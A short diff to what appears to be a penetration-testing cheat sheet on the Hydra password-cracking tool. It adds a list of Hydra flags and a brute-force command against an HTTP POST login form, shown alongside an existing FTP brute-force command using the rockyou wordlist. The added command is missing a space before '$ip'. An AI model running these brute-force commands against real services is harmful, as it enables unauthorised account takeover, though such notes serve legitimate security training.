@@ -66,6 +66,22 @@ The -t flag specifies the number of threads you are running in the attack. For s
 
 If the service you are attacking is running on a *non-standard* port, you must specify that with the -s flag. ex: ftp is running on port 1021, the end of the attack would look be **ftp -s 1021**
 
+**Hydra Options:
+
+* -l Single username
+* -L Username list
+* -p Password
+* -P Password list
+* -t Threads
+* -V Verbose output
+* -f Stop when valid login found
+* -s Specific port
+
+**HTTP(s) Post Form**
+```shell
+hydra -l admin -P rockyou.txt$ip http-post-form '<Login Page>:<Request Body>:<Error Message>' -V
+```
+
 **FTP**
 ```shell
 hydra -t 1 -l user -P rockyou.txt -vV $ip ftp
